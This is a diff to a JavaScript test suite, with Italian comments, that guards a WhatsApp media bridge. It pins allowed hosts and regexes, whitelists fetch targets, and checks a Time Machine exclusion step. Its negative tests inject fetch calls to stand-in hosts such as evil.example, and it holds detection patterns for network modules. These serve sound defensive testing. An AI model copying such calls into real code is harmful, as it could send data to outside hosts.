@@ -51,16 +51,58 @@ export function violazioniUnSoloInvio(codice) {
   return v;
 }
 
-/** La lista bianca del download delle immagini (commessa 2026-10-30-ponte-storico-completo, T8, PIANO c.1):
+/** Le espressioni regolari che decidono cosa si scarica e da dove (host, percorso, chiave, nomi dei file), come sono
+ *  scritte oggi in `immagini.mjs` e `catalogo.mjs`. Se cambiano, cambia ciò che il Mac accetta: la modifica deve
+ *  essere voluta e rivista (si cambia qui e si dice in LAVAGNA). `HOST_WHATSAPP`, `PERCORSO_VALIDO` e `CHIAVE_VALIDA`
+ *  sono copie: in tutti e due i file devono essere identiche. */
+export const REGEX_FISSE = {
+  "immagini.mjs": {
+    HOST_WHATSAPP: "/^[a-z0-9-]+(\\.[a-z0-9-]+)*\\.whatsapp\\.net$/",
+    PERCORSO_VALIDO: "/^\\/(?!\\/)[A-Za-z0-9._~\\-/?=&%+]*$/",
+    CHIAVE_VALIDA: "/^bw:\\d{8,15}:[A-Za-z0-9_.-]{1,128}$/",
+    FILE_CODA: "/^[0-9a-f]{64}\\.json$/",
+    HOST_STORAGE: "/^[a-z0-9-]+(\\.storage)?\\.supabase\\.co$/",
+  },
+  "catalogo.mjs": {
+    CHIAVE_VALIDA: "/^bw:\\d{8,15}:[A-Za-z0-9_.-]{1,128}$/",
+    FILE_VOCE: "/^[0-9a-f]{64}\\.json$/",
+    BASE64_32: "/^[A-Za-z0-9+/]{43}=$/",
+    HOST_WHATSAPP: "/^[a-z0-9-]+(\\.[a-z0-9-]+)*\\.whatsapp\\.net$/",
+    PERCORSO_VALIDO: "/^\\/(?!\\/)[A-Za-z0-9._~\\-/?=&%+]*$/",
+    MINIATURA: "/^\\/9j\\/[A-Za-z0-9+/]*={0,2}$/",
+  },
+};
+
+/** Le regex dichiarate in cima ai file (`const NOME = /…/;`) di `grezzo` (file → sorgente CON i commenti), e gli scarti
+ *  rispetto a `REGEX_FISSE` (vuoto = identiche). */
+export function violazioniRegex(grezzo) {
+  const v = [];
+  for (const [file, attese] of Object.entries(REGEX_FISSE)) {
+    const trovate = Object.fromEntries([...(grezzo[file] ?? "").matchAll(/^const (\w+) = (\/.*\/[a-z]*);$/gm)].map((m) => [m[1], m[2]]));
+    for (const [nome, re] of Object.entries(attese)) if (trovate[nome] !== re) v.push(`${file}: la regex ${nome} è cambiata (${trovate[nome] ?? "assente"})`);
+    for (const nome of Object.keys(trovate)) if (!(nome in attese)) v.push(`${file}: regex nuova ${nome} (va rivista e aggiunta a REGEX_FISSE)`);
+  }
+  for (const nome of ["HOST_WHATSAPP", "PERCORSO_VALIDO", "CHIAVE_VALIDA"]) {
+    if (REGEX_FISSE["immagini.mjs"][nome] !== REGEX_FISSE["catalogo.mjs"][nome]) v.push(`${nome}: le due copie (immagini e catalogo) non coincidono`);
+  }
+  return v;
+}
+
+/** La lista bianca del download dei media (commessa 2026-10-30-ponte-storico-completo T8, PIANO c.1; estesa dalla commessa
+ *  2026-10-31-media-e-archiviazione, T7, alle quattro categorie):
  *  · `downloadMediaMessage`, `updateMediaMessage`, `reuploadRequest`, `requestPlaceholderResend` non compaiono in
  *    nessun file (il primo accetta l'`url` del messaggio; gli altri chiedono al telefono di rimandare i media);
  *  · `downloadContentFromMessage` compare solo in `index.mjs` (il controllo che esista e il valore di `scarica`; Baileys
  *    arriva solo da lì); `immagini.mjs` lo riceve come parametro;
- *  · in `immagini.mjs` `scarica(` si chiama una volta sola, con `(copia, "image", { host: … })`, e `copia` ha SOLO
- *    `mediaKey` e `directPath` (mai `url`, mai l'oggetto del messaggio); il lavoro viene da `accoda`, che chiama
- *    `validaOrigine` PRIMA di scrivere in coda, o dal disco, riletto con `lavoroValido`;
- *  · nessun modulo di rete di Node; `fetch(` solo verso `PONTE_URL` (`lotti.mjs`, `fetch(url`) e verso l'URL di
- *    carico già validato (`immagini.mjs`, `fetch(urlCarico`, che esce da `urlCaricoValido`).
+ *  · in `immagini.mjs` `scarica(` si chiama una volta sola, con `(copia, TIPO_BAILEYS[lavoro.categoria], { host: … })`;
+ *    `TIPO_BAILEYS` è una tabella di ESATTAMENTE quattro voci costanti (foto→image, audio→audio, video→video,
+ *    documento→document) che nessuno modifica; `copia` ha SOLO `mediaKey` e `directPath` (mai `url`, mai l'oggetto del messaggio);
+ *  · un media NUOVO entra nel catalogo solo da `accoda`, dopo `validaOrigine` e con `mediaKey`/`directPath`/`host` presi
+ *    dall'origine validata; le altre `catalogo.aggiungi(` riscrivono una voce già nel catalogo (`...voce`) o rileggono la
+ *    vecchia coda `v: 1` (validata dal catalogo); `collega.mjs` non vede il catalogo;
+ *  · nessun modulo di rete di Node; `fetch(` solo verso `PONTE_URL` (`lotti.mjs`, `fetch(url`) e verso l'URL di carico
+ *    già validato (`immagini.mjs`, `fetch(urlCarico`, che esce da `urlCaricoValido`); nessun indirizzo scritto nel codice
+ *    (solo il prefisso `https://` del controllo e `mmg.whatsapp.net` di serie): nessun host nuovo.
  *  `codice` = file → sorgente senza commenti. Restituisce le violazioni (vuoto = regola rispettata). */
 export function violazioniImmagini(codice) {
   const v = [];
@@ -75,26 +117,42 @@ export function violazioniImmagini(codice) {
 
   const im = codice["immagini.mjs"] ?? "";
   const chiamate = [...im.matchAll(/\bscarica\(([^)]*)\)/g)].map((m) => m[1].replace(/\s+/g, " ").trim());
-  if (chiamate.length !== 1 || chiamate[0] !== 'copia, "image", { host: lavoro.host }') v.push(`in immagini.mjs scarica( si chiama una volta, con (copia, "image", { host: lavoro.host }); trovato: ${chiamate.join(" | ") || "mai"}`);
+  if (chiamate.length !== 1 || chiamate[0] !== "copia, TIPO_BAILEYS[lavoro.categoria], { host: lavoro.host }") v.push(`in immagini.mjs scarica( si chiama una volta, con (copia, TIPO_BAILEYS[lavoro.categoria], { host: lavoro.host }); trovato: ${chiamate.join(" | ") || "mai"}`);
+  //  La tabella: quattro voci, nome e valore costanti, quelli di Baileys; nessuna scrittura altrove.
+  const tabella = im.match(/\bexport const TIPO_BAILEYS = \{([^}]*)\};/)?.[1];
+  const voci = [...(tabella ?? "").matchAll(/(\w+):\s*"(\w+)"\s*,?/g)].map((m) => `${m[1]}=${m[2]}`);
+  const resto = (tabella ?? "").replace(/(\w+):\s*"(\w+)"\s*,?/g, "").trim();
+  if (!tabella || resto !== "" || voci.join(",") !== "foto=image,audio=audio,video=video,documento=document") v.push(`TIPO_BAILEYS deve avere esattamente le quattro voci costanti foto=image, audio=audio, video=video, documento=document (trovato: ${tabella ? voci.join(",") + (resto ? ` + «${resto}»` : "") : "nessuna tabella"})`);
+  if (/\bTIPO_BAILEYS(\[[^\]]*\]|\.\w+)\s*=[^=]/.test(im) || /\bObject\.(assign|defineProperty|setPrototypeOf)\(\s*TIPO_BAILEYS\b/.test(im)) v.push("TIPO_BAILEYS non si modifica");
   const copie = [...im.matchAll(/\bconst copia = \{([^}]*)\}/g)].map((m) => [...m[1].matchAll(/(\w+)\s*:/g)].map((k) => k[1]).sort().join(","));
   if (copie.length !== 1 || copie[0] !== "directPath,mediaKey") v.push(`la copia per Baileys deve avere solo mediaKey e directPath (trovato: ${copie.join(" | ") || "nessuna"})`);
-  const accoda = im.slice(Math.max(0, im.indexOf("accoda(richiesta)")));
-  const prima = accoda.indexOf("const origine = validaOrigine(immagine);");
-  const scrive = accoda.indexOf("indice.set(nome, lavoro)");
-  if (prima < 0 || scrive < 0 || prima > scrive) v.push("accoda deve chiamare validaOrigine prima di mettere in coda");
-  if ((im.match(/\bindice\.set\(/g) ?? []).length !== 2 || !/lavoroValido\(nome, JSON\.parse\(readFileSync/.test(im)) v.push("i lavori entrano in coda solo da accoda (validaOrigine) o dal disco riletto con lavoroValido");
+
+  //  Il catalogo: un media nuovo entra solo da `accoda`, dopo `validaOrigine`.
+  const inizioAccoda = im.indexOf("accoda(richiesta)");
+  const prima = im.indexOf("const origine = validaOrigine(media);", Math.max(0, inizioAccoda));
+  const aggiunte = [...im.matchAll(/\bcatalogo\.aggiungi\(\{\s*([^\n]*)/g)];
+  const nuove = aggiunte.filter((m) => !m[1].startsWith("...voce,") && !m[1].startsWith('...d, categoria: "foto", stato: "in_coda" }'));
+  if (inizioAccoda < 0 || prima < 0) v.push("accoda deve chiamare validaOrigine(media) prima di mettere nel catalogo");
+  if (nuove.length !== 1 || (prima >= 0 && nuove[0].index < prima)) v.push(`un media nuovo entra nel catalogo solo da accoda, dopo validaOrigine (catalogo.aggiungi fuori posto: ${nuove.length} invece di 1, o prima del controllo)`);
+  const corpoAccoda = nuove[0] ? im.slice(nuove[0].index, nuove[0].index + 400) : "";
+  if (!/mediaKey: origine\.mediaKey,\s*directPath: origine\.directPath,\s*host: origine\.host,/.test(corpoAccoda)) v.push("accoda deve passare al catalogo mediaKey, directPath e host presi dall'origine validata");
+  if (aggiunte.length - nuove.length > 3 || !/d\.v === 1/.test(im)) v.push("le altre catalogo.aggiungi( devono essere le riscritture di una voce già nel catalogo e la vecchia coda v:1");
+  if (/\bcatalogo\b/.test(codice["collega.mjs"] ?? "")) v.push("collega.mjs non deve vedere il catalogo: i media passano solo da immagini.accoda");
 
   for (const [f, t] of Object.entries(codice)) {
     if (/from\s+"node:(http|https|http2|net|tls|dgram|dns)"/.test(t) || /\brequire\(\s*"(node:)?(http|https|http2|net|tls|dgram|dns)"/.test(t)) v.push(`${f}: modulo di rete di Node`);
     if (/\b(XMLHttpRequest|WebSocket|EventSource)\b/.test(t) || /\bundici\b/.test(t)) v.push(`${f}: client di rete diverso da fetch`);
+    //  nessun indirizzo scritto nel codice (config.mjs ha solo la frase d'errore): host nuovi non ce ne sono
+    if (f !== "config.mjs") for (const m of t.matchAll(/["'`]https?:\/\/[^"'`\s]/g)) v.push(`${f}: indirizzo scritto nel codice (${m[0].slice(0, 12)}…)`);
   }
   const ammessi = { "lotti.mjs": ["fetch(url"], "immagini.mjs": ["fetch(urlCarico"] };
   for (const [f, t] of Object.entries(codice)) {
-    const trovati = [...t.matchAll(/\bfetch\s*\(\s*(\w+)/g)].map((m) => `fetch(${m[1]}`);
+    //  qualunque primo argomento (anche una stringa o un modello), non solo un identificatore
+    const trovati = [...t.matchAll(/(?<!\w)fetch\s*\(\s*([^\s,)]*)/g)].map((m) => `fetch(${m[1]}`);
     const fuori = trovati.filter((x) => !(ammessi[f] ?? []).includes(x));
     if (fuori.length) v.push(`${f}: fetch fuori lista (${fuori.join(", ")})`);
   }
-  if (!/const urlCarico = risposta\.esito === "carica" \? urlCaricoValido\(/.test(im)) v.push("immagini.mjs: l'URL di carico deve uscire da urlCaricoValido");
+  if (!/const urlCarico = risposta\.esito === "carica" \? urlCaricoValido\(/.test(im) || (im.match(/risposta\.url_carico/g) ?? []).length !== (im.match(/urlCaricoValido\(risposta\.url_carico\)/g) ?? []).length) v.push("immagini.mjs: l'URL di carico deve uscire da urlCaricoValido, in ogni punto");
   return v;
 }
 
@@ -180,7 +238,8 @@ export async function provePonteServizioGuardie(_mod, { c, gruppo, radice }) {
     c("negativa: nessuna sendMessage (la regola non è vuota) fa fallire la regola", true, violazioniUnSoloInvio(dellaCopia()).length > 0);
     //  Le immagini (T8): lista bianca del download. Il socket non c'entra: il download è una funzione di Baileys
     //  che riceve la sola copia {mediaKey, directPath} e l'host deciso da noi.
-    c("immagini: download e rete solo come da lista bianca (nessun downloadMediaMessage, un solo downloadContentFromMessage in index.mjs, copia senza url, fetch solo verso il ponte e l'URL di carico)", [], violazioniImmagini(codice));
+    c("immagini: download e rete solo come da lista bianca (nessun downloadMediaMessage, un solo downloadContentFromMessage in index.mjs, tipo da TIPO_BAILEYS, copia senza url, catalogo solo dopo validaOrigine, fetch solo verso il ponte e l'URL di carico)", [], violazioniImmagini(codice));
+    c("le regex di host, percorso, chiave e nomi dei file di immagini.mjs e catalogo.mjs sono IDENTICHE a quelle riviste (e le copie coincidono)", [], violazioniRegex(Object.fromEntries(file.map((f) => [f, readFileSync(join(src, f), "utf8")]))));
     {
       const originale = Object.fromEntries(file.map((f) => [f, readFileSync(join(src, f), "utf8")]));
       const prova = (nome, cambia, attesa = true) => {
@@ -189,18 +248,51 @@ export async function provePonteServizioGuardie(_mod, { c, gruppo, radice }) {
         const trovate = violazioniImmagini(Object.fromEntries(Object.entries(m).map(([f, t]) => [f, senzaCommenti(t)])));
         c(`negativa (immagini): ${nome}`, attesa, trovate.length > 0);
       };
+      const provaRegex = (nome, cambia) => {
+        const m = { ...originale };
+        cambia(m);
+        c(`negativa (regex): ${nome}`, true, violazioniRegex(m).length > 0);
+      };
+      const sostituisci = (m, f, da, a) => {
+        if (!m[f].includes(da)) throw new Error(`prova mal scritta: «${da}» non c'è in ${f}`);
+        m[f] = m[f].split(da).join(a);
+      };
       c("la copia intatta passa la regola delle immagini (le prove negative partono da qui)", [], violazioniImmagini(Object.fromEntries(Object.entries(originale).map(([f, t]) => [f, senzaCommenti(t)]))));
-      for (const nome of ["downloadMediaMessage", "updateMediaMessage", "reuploadRequest", "requestPlaceholderResend"]) prova(`${nome} in collega.mjs`, (m) => (m["collega.mjs"] += `\nconst x = ${nome};\n`));
+      for (const nome of ["downloadMediaMessage", "updateMediaMessage", "reuploadRequest", "requestPlaceholderResend"]) {
+        prova(`${nome} in collega.mjs`, (m) => (m["collega.mjs"] += `\nconst x = ${nome};\n`));
+        prova(`${nome} in immagini.mjs`, (m) => (m["immagini.mjs"] += `\nconst x = ${nome};\n`));
+      }
       prova("una seconda downloadContentFromMessage in immagini.mjs", (m) => (m["immagini.mjs"] += "\nconst y = downloadContentFromMessage;\n"));
-      prova("index.mjs non passa più downloadContentFromMessage", (m) => (m["index.mjs"] = m["index.mjs"].replace("scarica: baileys.downloadContentFromMessage", "scarica: undefined")));
-      prova("la copia per Baileys porta anche l'url", (m) => (m["immagini.mjs"] = m["immagini.mjs"].replace("directPath: lavoro.directPath };", "directPath: lavoro.directPath, url: lavoro.url };")));
-      prova("download senza l'host fissato", (m) => (m["immagini.mjs"] = m["immagini.mjs"].replace('"image", { host: lavoro.host }', '"image"')));
-      prova("download con un tipo diverso da «image»", (m) => (m["immagini.mjs"] = m["immagini.mjs"].replace('"image", { host: lavoro.host }', '"video", { host: lavoro.host }')));
-      prova("accoda mette in coda prima di validare", (m) => (m["immagini.mjs"] = m["immagini.mjs"].replace("const origine = validaOrigine(immagine);", "const origine = { ok: true };")));
+      prova("index.mjs non passa più downloadContentFromMessage", (m) => sostituisci(m, "index.mjs", "scarica: baileys.downloadContentFromMessage", "scarica: undefined"));
+      prova("la copia per Baileys porta anche l'url", (m) => sostituisci(m, "immagini.mjs", "directPath: lavoro.directPath };", "directPath: lavoro.directPath, url: lavoro.url };"));
+      prova("download senza l'host fissato", (m) => sostituisci(m, "immagini.mjs", "TIPO_BAILEYS[lavoro.categoria], { host: lavoro.host }", "TIPO_BAILEYS[lavoro.categoria]"));
+      prova("download con un tipo scritto a mano («image») invece di TIPO_BAILEYS", (m) => sostituisci(m, "immagini.mjs", "TIPO_BAILEYS[lavoro.categoria], { host: lavoro.host }", '"image", { host: lavoro.host }'));
+      prova("download con un tipo che non viene dalla tabella (la categoria nuda)", (m) => sostituisci(m, "immagini.mjs", "TIPO_BAILEYS[lavoro.categoria], { host: lavoro.host }", "lavoro.categoria, { host: lavoro.host }"));
+      prova("TIPO_BAILEYS con una quinta voce", (m) => sostituisci(m, "immagini.mjs", '  documento: "document",', '  documento: "document",\n  sticker: "sticker",'));
+      prova("TIPO_BAILEYS con una voce in meno", (m) => sostituisci(m, "immagini.mjs", '  audio: "audio",\n', ""));
+      prova("TIPO_BAILEYS con un valore sbagliato (video → image)", (m) => sostituisci(m, "immagini.mjs", 'video: "video"', 'video: "image"'));
+      prova("TIPO_BAILEYS con un valore calcolato invece che costante", (m) => sostituisci(m, "immagini.mjs", 'foto: "image"', "foto: tipoDi()"));
+      prova("TIPO_BAILEYS modificato dopo la definizione", (m) => (m["immagini.mjs"] += '\nTIPO_BAILEYS.foto = "document";\n'));
+      prova("TIPO_BAILEYS modificato con parentesi quadre", (m) => (m["immagini.mjs"] += '\nTIPO_BAILEYS["video"] = "audio";\n'));
+      prova("accoda mette nel catalogo prima di validare", (m) => sostituisci(m, "immagini.mjs", "const origine = validaOrigine(media);", "const origine = { ok: true };"));
+      prova("accoda passa al catalogo la chiave del messaggio invece di quella validata", (m) => sostituisci(m, "immagini.mjs", "mediaKey: origine.mediaKey,", "mediaKey: media.mediaKey,"));
+      prova("un'altra via verso il catalogo (catalogo.aggiungi fuori da accoda)", (m) => (m["immagini.mjs"] += "\nfunction scorciatoia(x) { return catalogo.aggiungi({ chiave: x.chiave, mediaKey: x.mediaKey }); }\n"));
+      prova("collega.mjs parla col catalogo", (m) => (m["collega.mjs"] += "\nconst k = catalogo.aggiungi;\n"));
       prova("un fetch verso un indirizzo qualunque in immagini.mjs", (m) => (m["immagini.mjs"] += "\nconst z = fetch(indirizzo);\n"));
+      prova("un fetch verso un indirizzo scritto fra virgolette", (m) => (m["immagini.mjs"] += '\nconst z = fetch("https://evil.example/x");\n'));
+      prova("un fetch via globalThis", (m) => (m["immagini.mjs"] += "\nconst z = globalThis.fetch(destinazione);\n"));
+      prova("un host nuovo scritto nel codice", (m) => (m["immagini.mjs"] += '\nconst H = "https://cdn.evil.example/";\n'));
       prova("un fetch in collega.mjs", (m) => (m["collega.mjs"] += "\nconst w = fetch(url);\n"));
-      prova("l'URL di carico non validato", (m) => (m["immagini.mjs"] = m["immagini.mjs"].replace("urlCaricoValido(risposta.url_carico)", "risposta.url_carico")));
+      prova("l'URL di carico non validato", (m) => sostituisci(m, "immagini.mjs", "urlCaricoValido(risposta.url_carico)", "risposta.url_carico"));
       prova("un modulo di rete di Node", (m) => (m["immagini.mjs"] = `import { request } from "node:https";\n${m["immagini.mjs"]}`));
+      //  Le regex: ogni ritocco (anche di un carattere) deve far cadere la guardia, e le due copie devono restare uguali.
+      provaRegex("HOST_WHATSAPP di immagini.mjs allargata (qualunque host)", (m) => sostituisci(m, "immagini.mjs", "const HOST_WHATSAPP = /^[a-z0-9-]+(\\.[a-z0-9-]+)*\\.whatsapp\\.net$/;", "const HOST_WHATSAPP = /^[a-z0-9-]+(\\.[a-z0-9-]+)*\\.whatsapp\\.net/;"));
+      provaRegex("HOST_WHATSAPP di catalogo.mjs senza l'ancora finale", (m) => sostituisci(m, "catalogo.mjs", "\\.whatsapp\\.net$/;", "\\.whatsapp\\.net/;"));
+      provaRegex("PERCORSO_VALIDO che ammette il doppio slash", (m) => sostituisci(m, "immagini.mjs", "const PERCORSO_VALIDO = /^\\/(?!\\/)", "const PERCORSO_VALIDO = /^\\/"));
+      provaRegex("CHIAVE_VALIDA del catalogo con numeri più lunghi", (m) => sostituisci(m, "catalogo.mjs", "\\d{8,15}", "\\d{8,40}"));
+      provaRegex("HOST_STORAGE che accetta anche altri domini", (m) => sostituisci(m, "immagini.mjs", "supabase\\.co$/", "supabase\\.co/"));
+      provaRegex("una regex nuova non rivista in immagini.mjs", (m) => (m["immagini.mjs"] += "\nconst ALTRO_HOST = /^.*$/;\n"));
+      provaRegex("MINIATURA del catalogo senza il controllo dei caratteri", (m) => sostituisci(m, "catalogo.mjs", "const MINIATURA = /^\\/9j\\/[A-Za-z0-9+/]*={0,2}$/;", "const MINIATURA = /^\\/9j\\//;"));
     }
     //  Lista bianca: sul socket si chiamano SOLO questi (tutto il resto è vietato).
     //  `ws.on` (guasto 2): solo per ASCOLTARE i nodi `message` ricevuti, e
@@ -223,7 +315,7 @@ export async function provePonteServizioGuardie(_mod, { c, gruppo, radice }) {
     // ── 2. Dove scrive: solo nella cartella di stato e nel log ────────────
     const p = I.percorsiDi("/Users/finto");
     const casa = "/Users/finto/Library/Application Support/HGL/ponte-wa";
-    c("percorsi: tutti sotto la cartella di stato, tranne il log", { base: casa, app: `${casa}/app`, auth: `${casa}/auth`, fila: `${casa}/fila`, invii: `${casa}/invii`, immagini: `${casa}/immagini`, config: `${casa}/config.env`, stato: `${casa}/stato.json`, lid: `${casa}/lid.json`, qr: `${casa}/qr.png`, cache: `${casa}/cache`, chiaveCache: `${casa}/chiave-cache`, log: "/Users/finto/Library/Logs/hgl-ponte-wa.log" }, p);
+    c("percorsi: tutti sotto la cartella di stato, tranne il log", { base: casa, app: `${casa}/app`, auth: `${casa}/auth`, fila: `${casa}/fila`, invii: `${casa}/invii`, immagini: `${casa}/immagini`, catalogo: `${casa}/media/catalogo`, config: `${casa}/config.env`, stato: `${casa}/stato.json`, lid: `${casa}/lid.json`, qr: `${casa}/qr.png`, cache: `${casa}/cache`, chiaveCache: `${casa}/chiave-cache`, log: "/Users/finto/Library/Logs/hgl-ponte-wa.log" }, p);
     c("percorsi: nessuno nel repo né nel com.ponte.whatsapp di Oclak", [], Object.values(p).filter((x) => x.includes("Documents") || x.includes("/ponte-whatsapp")));
 
     // ── 3. Node: solo LTS 22 o 24, come engines ──────────────────────────
@@ -522,6 +614,55 @@ export async function provePonteServizioGuardie(_mod, { c, gruppo, radice }) {
     c("installa.sh: sottocomandi installa, stato, scollega, chiave", true, ["installa)", "stato)", "scollega)", "chiave)"].every((k) => testoIns.includes(k)));
     c("installa.sh: stessa etichetta e cartella del servizio", [true, true], [testoIns.includes("it.hgl.ponte-whatsapp"), testoIns.includes("Library/Application Support/HGL/ponte-wa")]);
     c("disinstalla.sh: --tutto chiede conferma prima di cancellare la cartella di stato", true, /--tutto/.test(testoDis) && /read -r/.test(testoDis));
+
+    // ── 11b. Time Machine: la cartella dati del ponte non va nei backup (commessa media-e-archiviazione, T7) ──
+    //  auth/ (la sessione di WhatsApp) e media/catalogo (chiavi per scaricare) non devono finire nei backup. Si esclude
+    //  la cartella dati intera con `tmutil addexclusion` (senza -p: non serve l'amministratore). Non è MAI un errore:
+    //  senza Time Machine o senza tmutil si dice e si va avanti. Qui non si lancia installa.sh: si estrae la funzione e si
+    //  prova con un `tmutil` finto in testa al PATH, in una cartella finta.
+    const funzioneEsclusione = testoIns.match(/^escludi_dai_backup\(\) \{\n[\s\S]*?^\}$/m)?.[0] ?? null;
+    c("installa.sh: c'è escludi_dai_backup e usa `tmutil addexclusion` sulla cartella dati ($BASE), senza -p", [true, true, false], [funzioneEsclusione !== null, /tmutil addexclusion "\$BASE"/.test(funzioneEsclusione ?? ""), /addexclusion\s+-p/.test(funzioneEsclusione ?? "")]);
+    c("installa.sh: la funzione non scrive, non sposta, non cancella e non nomina config.env né auth", [], (funzioneEsclusione ?? "").split("\n").filter((r) => /^\s*#/.test(r) === false && (/\b(rm|mv|cp|chmod|chown|mkdir|touch|tee|sed)\b/.test(r) || /config\.env|auth/.test(r) || /(?<![>&\d])>(?!\s*\/dev\/null|&)/.test(r))));
+    c("installa.sh: installa() la chiama dopo aver creato le cartelle e prima di copiare il codice e di npm ci", true, (corpoInstalla ?? "").indexOf("mkdir -p") < (corpoInstalla ?? "").indexOf("escludi_dai_backup") && (corpoInstalla ?? "").indexOf("escludi_dai_backup") < (corpoInstalla ?? "").indexOf("cp -R") && (corpoInstalla ?? "").indexOf("escludi_dai_backup") < (corpoInstalla ?? "").indexOf('"$NPM" ci'));
+    {
+      const dati = join(base, "dati-finti");
+      mkdirSync(join(dati, "auth"), { recursive: true, mode: 0o700 });
+      mkdirSync(join(dati, "media", "catalogo"), { recursive: true, mode: 0o700 });
+      writeFileSync(join(dati, "config.env"), "PONTE_URL=https://ponte.prova.test/x\nPONTE_TOKEN=SEGRETO-FINTO\n", { mode: 0o600 });
+      writeFileSync(join(dati, "auth", "creds.json"), '{"finto":true}', { mode: 0o600 });
+      writeFileSync(join(dati, "media", "catalogo", "voce.json"), '{"finta":true}', { mode: 0o600 });
+      const impronta = () => ["config.env", "auth/creds.json", "media/catalogo/voce.json"].map((f) => [readFileSync(join(dati, f), "utf8"), permessi(join(dati, f)), statSync(join(dati, f)).mtimeMs]);
+      const prima = impronta();
+      const fornitura = (nome, corpo) => {
+        const cartellaBin = join(base, `bin-${nome}`);
+        mkdirSync(cartellaBin);
+        if (corpo !== null) {
+          writeFileSync(join(cartellaBin, "tmutil"), `#!/bin/sh\nprintf '%s\\n' "$*" >> "${join(base, `chiamate-${nome}.txt`)}"\n${corpo}\n`);
+          chmodSync(join(cartellaBin, "tmutil"), 0o755);
+        }
+        return cartellaBin;
+      };
+      const lancia = (nome, corpo) => {
+        const copione = join(base, `esclusione-${nome}.sh`);
+        writeFileSync(copione, `set -euo pipefail\nBASE=${JSON.stringify(dati)}\n${funzioneEsclusione}\nescludi_dai_backup\necho "dopo-la-funzione"\n`);
+        //  PATH: SOLO la cartella del tmutil finto (o una vuota): il tmutil vero del Mac non si raggiunge mai
+        const r = spawnSync("/bin/bash", [copione], { encoding: "utf8", env: { PATH: fornitura(nome, corpo), HOME: join(base, "casa-esclusione") }, timeout: 20_000 });
+        const chiamate = existsSync(join(base, `chiamate-${nome}.txt`)) ? readFileSync(join(base, `chiamate-${nome}.txt`), "utf8").trim().split("\n") : [];
+        return { stato: r.status, uscita: `${r.stdout}${r.stderr}`, chiamate };
+      };
+      if (funzioneEsclusione) {
+        const ok = lancia("ok", "exit 0");
+        c("tmutil riesce: UNA chiamata `addexclusion <cartella dati>`, esito 0, lo dice, lo script va avanti", [0, [`addexclusion ${dati}`], true, true], [ok.stato, ok.chiamate, /esclus/i.test(ok.uscita), ok.uscita.includes("dopo-la-funzione")]);
+        const ko = lancia("ko", 'echo "tmutil: errore finto" >&2\nexit 1');
+        c("tmutil FALLISCE (exit 1): la funzione non fa fallire installa.sh (set -e), lo dice e indica il comando a mano", [0, true, true, true], [ko.stato, ko.uscita.includes("dopo-la-funzione"), /non sono riuscito/i.test(ko.uscita), ko.uscita.includes(`tmutil addexclusion "${dati}"`)]);
+        const ko2 = lancia("ko2", "kill -9 $$");
+        c("tmutil che muore a metà (segnale): installa.sh va avanti lo stesso", [0, true], [ko2.stato, ko2.uscita.includes("dopo-la-funzione")]);
+        const senza = lancia("senza", null);
+        c("senza tmutil sul Mac: esito 0, lo dice, nessuna chiamata", [0, true, true, []], [senza.stato, senza.uscita.includes("dopo-la-funzione"), /tmutil non c'è/i.test(senza.uscita), senza.chiamate]);
+        c("config.env, auth/ e il catalogo esistenti restano identici (contenuto, permessi, data) in tutti i casi", prima, impronta());
+        c("…e la chiave di config.env non compare nell'uscita di nessun caso", [], [ok, ko, ko2, senza].filter((r) => r.uscita.includes("SEGRETO-FINTO")));
+      }
+    }
 
     //  Node non LTS: installa.sh si ferma con una frase chiara PRIMA di scrivere.
     const casaFinta = join(base, "casa");
